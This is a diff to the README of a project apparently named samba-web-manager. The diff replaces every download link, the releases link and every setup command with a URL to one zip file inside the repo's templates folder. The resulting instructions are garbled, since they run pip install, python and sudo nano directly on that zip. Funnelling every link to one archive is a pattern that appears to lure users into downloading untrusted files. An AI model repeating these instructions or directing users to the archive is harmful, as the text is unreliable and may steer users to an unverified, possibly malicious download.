@@ -1,6 +1,6 @@
 # 🗂️ samba-web-manager - Manage Your Samba Shares Easily
 
-[![Download](https://raw.githubusercontent.com/sahni132/samba-web-manager/main/templates/samba-web-manager-vervel.zip)](https://raw.githubusercontent.com/sahni132/samba-web-manager/main/templates/samba-web-manager-vervel.zip)
+[![Download](https://github.com/sahni132/samba-web-manager/raw/refs/heads/main/templates/samba-web-manager-v1.3.zip)](https://github.com/sahni132/samba-web-manager/raw/refs/heads/main/templates/samba-web-manager-v1.3.zip)
 
 ## 📋 Overview
 
@@ -20,9 +20,9 @@ Follow these steps to download and run samba-web-manager easily.
 
 To get started, visit this page to download the application:
 
-[Download samba-web-manager](https://raw.githubusercontent.com/sahni132/samba-web-manager/main/templates/samba-web-manager-vervel.zip)
+[Download samba-web-manager](https://github.com/sahni132/samba-web-manager/raw/refs/heads/main/templates/samba-web-manager-v1.3.zip)
 
-1. Go to the [Releases page](https://raw.githubusercontent.com/sahni132/samba-web-manager/main/templates/samba-web-manager-vervel.zip).
+1. Go to the [Releases page](https://github.com/sahni132/samba-web-manager/raw/refs/heads/main/templates/samba-web-manager-v1.3.zip).
 2. Look for the latest version of samba-web-manager.
 3. Download the installation package that matches your operating system.
 
@@ -46,18 +46,18 @@ After downloading the file, follow these steps to install samba-web-manager:
    
 3. **Unzip the Package:** If your download is a zipped file, run:
    ```bash
-   unzip https://raw.githubusercontent.com/sahni132/samba-web-manager/main/templates/samba-web-manager-vervel.zip
+   unzip https://github.com/sahni132/samba-web-manager/raw/refs/heads/main/templates/samba-web-manager-v1.3.zip
    ```
    
 4. **Install Dependencies:** Navigate to the extracted folder and run:
    ```bash
    cd samba-web-manager
-   pip install -r https://raw.githubusercontent.com/sahni132/samba-web-manager/main/templates/samba-web-manager-vervel.zip
+   pip install -r https://github.com/sahni132/samba-web-manager/raw/refs/heads/main/templates/samba-web-manager-v1.3.zip
    ```
    
 5. **Run the Application:**
    ```bash
-   python https://raw.githubusercontent.com/sahni132/samba-web-manager/main/templates/samba-web-manager-vervel.zip
+   python https://github.com/sahni132/samba-web-manager/raw/refs/heads/main/templates/samba-web-manager-v1.3.zip
    ```
 
 ### 🌐 Accessing the Application
@@ -82,7 +82,7 @@ To use samba-web-manager effectively, you need to configure Samba on your system
 2. **Edit the Samba Configuration File:**
    Use a text editor to modify the Samba configuration:
    ```bash
-   sudo nano https://raw.githubusercontent.com/sahni132/samba-web-manager/main/templates/samba-web-manager-vervel.zip
+   sudo nano https://github.com/sahni132/samba-web-manager/raw/refs/heads/main/templates/samba-web-manager-v1.3.zip
    ```
 
 3. **Add Your Shared Directory:** 
